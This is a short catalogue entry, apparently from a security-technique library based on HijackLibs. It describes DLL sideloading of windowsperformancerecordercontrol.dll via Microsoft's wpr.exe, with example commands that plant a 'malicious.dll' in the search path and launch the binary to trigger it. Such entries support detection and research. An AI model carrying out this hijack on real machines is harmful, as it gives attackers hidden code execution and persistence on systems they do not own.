---
trust_level: community
id: windows-dllhijack-windowsperformancerecordercontrol
namespace: windows:dllhijack:windowsperformancerecordercontrol
name: windowsperformancerecordercontrol.dll
description: "windowsperformancerecordercontrol.dll — Sideloading hijacking (Microsoft)"
author: "Wietze Beukema"
version: "1.0.0"
capabilities:
  - security.defenseevasion.dll-hijack
platforms:
  - windows
techniques:
  - defense-evasion
  - persistence
execution:
  template: "windowsperformancerecordercontrol.dll"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
references:
  - label: "Reference"
    url: "https://wietze.github.io/blog/hijacking-dlls-in-windows"
  - label: "HijackLibs"
    url: "https://hijacklibs.net/entries/windowsperformancerecordercontrol.html"
---
examples:
  - description: "Place malicious windowsperformancerecordercontrol.dll in the search order location"
    command: "copy malicious.dll \"%PROGRAMFILES%\\windows kits\\10\\windows performance toolkit\\windowsperformancerecordercontrol.dll\""
  - description: "Execute the vulnerable binary to trigger the hijack"
    command: "\"%SYSTEM32%\\wpr.exe\""

# windowsperformancerecordercontrol.dll

**Vendor:** Microsoft

**Expected Location:** %PROGRAMFILES%\windows kits\10\windows performance toolkit

**Vulnerable Executables:**
- %SYSTEM32%\wpr.exe (Sideloading)

**Acknowledgement:** Wietze
